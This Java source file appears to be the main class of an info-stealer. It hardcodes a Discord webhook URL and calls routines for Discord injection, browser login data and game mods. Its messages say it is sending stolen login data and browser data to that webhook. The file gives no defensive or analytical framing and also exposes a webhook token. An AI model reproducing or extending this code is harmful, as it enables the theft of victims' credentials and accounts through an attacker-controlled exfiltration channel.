package io.github.luxotick;

import io.github.luxotick.impl.Browsers;
import io.github.luxotick.impl.DiscordInjector;
import io.github.luxotick.impl.Mods;

public class Start {
	static String webhookUrl = "https://discord.com/api/webhooks/1087418861504172132/yENsvgIwE432aQ6ASMzTn2TcRYxwW_ZuKQqRE34aFsqg3I1QzaOwrbFjbgAWLyRJKD-T";

	public static void main(String[] argument) throws Exception {
		if (DiscordInjector.instance == null){
			DiscordInjector.instance = new DiscordInjector();
		}
		Browsers webhook = new Browsers(webhookUrl);
		//DiscordInjector.instance.initialize();
		webhook.sendMessage("Done discord injecting, now sending login data");
		Browsers.main(argument);
		webhook.sendMessage("Done sending browsers, now sending mods");
		Mods.main(argument);
	}
	
}